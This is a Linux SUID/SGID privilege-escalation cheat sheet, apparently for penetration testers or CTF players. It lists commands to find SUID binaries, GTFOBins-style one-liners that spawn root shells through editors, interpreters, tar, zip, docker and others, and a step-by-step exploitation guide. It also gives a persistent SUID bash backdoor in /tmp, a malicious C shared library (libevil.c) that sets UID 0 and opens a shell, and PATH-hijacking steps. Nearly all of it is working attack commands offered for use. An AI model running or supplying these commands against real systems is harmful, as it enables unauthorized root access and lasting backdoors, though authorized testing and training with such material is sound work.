# SUID/SGID Privilege Escalation Checklist

## Finding SUID Binaries

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Find all SGID files
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# With file details
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

---

## Common Exploitable SUID Binaries

### GTFOBins Reference
Always check: https://gtfobins.github.io/

### Shells and Interpreters

| Binary | Exploit Command |
|--------|-----------------|
| `bash` | `bash -p` |
| `sh` | `sh -p` |
| `dash` | `dash -p` |
| `csh` | `csh -b` |
| `zsh` | `zsh` |
| `ksh` | `ksh -p` |

### Text Editors

| Binary | Exploit Command |
|--------|-----------------|
| `vim` | `vim -c ':!/bin/sh'` |
| `vi` | `vi -c ':!/bin/sh'` |
| `nano` | `nano` → `Ctrl+R` → `Ctrl+X` → `reset; sh 1>&0 2>&0` |
| `ed` | `ed` → `!/bin/sh` |
| `emacs` | `emacs -Q -nw --eval '(term "/bin/sh")'` |

### File Readers/Processors

| Binary | Exploit Command |
|--------|-----------------|
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `more` | `more /etc/passwd` → `!/bin/sh` |
| `cat` | Can read sensitive files |
| `head` | Can read sensitive files |
| `tail` | Can read sensitive files |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `sed` | Can modify files if writable |

### File Management

| Binary | Exploit Command |
|--------|-----------------|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `cp` | Copy shell: `cp /bin/bash /tmp/bash; chmod +s /tmp/bash` |
| `mv` | Move critical files |
| `chmod` | `chmod +s /bin/bash` |
| `chown` | `chown user:user /etc/passwd` |

### Network Tools

| Binary | Exploit Command |
|--------|-----------------|
| `nmap` | `nmap --interactive` → `!sh` (older versions) |
| `wget` | Download and overwrite files |
| `curl` | Download and overwrite files |
| `nc` | Reverse shell |

### Scripting Languages

| Binary | Exploit Command |
|--------|-----------------|
| `python` | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `python3` | `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `lua` | `lua -e 'os.execute("/bin/sh")'` |
| `php` | `php -r "pcntl_exec('/bin/sh', ['-p']);"` |

### Compression Tools

| Binary | Exploit Command |
|--------|-----------------|
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/a.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"` |
| `gzip` | Can compress/read files |

### Other Binaries

| Binary | Exploit Command |
|--------|-----------------|
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `env` | `env /bin/sh -p` |
| `time` | `time /bin/sh -p` |
| `timeout` | `timeout 10 /bin/sh -p` |
| `strace` | `strace -o /dev/null /bin/sh -p` |
| `ltrace` | `ltrace -o /dev/null /bin/sh -p` |

---

## Step-by-Step Exploitation

### 1. Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null | tee suid_binaries.txt
```

### 2. Identify Non-Standard SUID

Compare against default SUID binaries:

```
# Typical legitimate SUID binaries (may vary)
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/ping
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
```

### 3. Check GTFOBins

```bash
# For each suspicious binary
# Check https://gtfobins.github.io/#+suid
```

### 4. Verify SUID Bit Preserved

```bash
# Run binary and check effective UID
# Should show euid=0 if SUID to root
id
```

### 5. Exploit Example

```bash
# Example: find with SUID
find . -exec /bin/sh -p \; -quit

# Example: python with SUID  
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: bash with SUID
/usr/bin/bash -p
```

---

## Creating Persistent SUID Shell

If you get root temporarily:

```bash
# Copy bash and set SUID
cp /bin/bash /tmp/bash
chmod +s /tmp/bash

# Later, get root shell
/tmp/bash -p
```

---

## Custom SUID Binary Exploitation

### Shared Library Hijacking

If SUID binary loads shared libraries:

```bash
# Check loaded libraries
ldd /path/to/suid_binary

# Check for missing libraries
strace /path/to/suid_binary 2>&1 | grep -i "open.*\.so"
```

Create malicious library:

```c
// libevil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o /path/to/library.so libevil.c
```

### PATH Hijacking

If SUID binary calls other binaries without absolute path:

```bash
# Check what binary calls
strings /path/to/suid_binary | grep -E '^[a-z]'
# Or
ltrace /path/to/suid_binary 2>&1

# Create malicious binary
echo '/bin/bash -p' > /tmp/called_binary
chmod +x /tmp/called_binary

# Modify PATH
export PATH=/tmp:$PATH

# Run SUID binary
/path/to/suid_binary
```

---

## SGID Exploitation

Same techniques apply, but for group privileges:

```bash
# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check group
ls -la /path/to/sgid_binary

# May give access to group files/resources
```



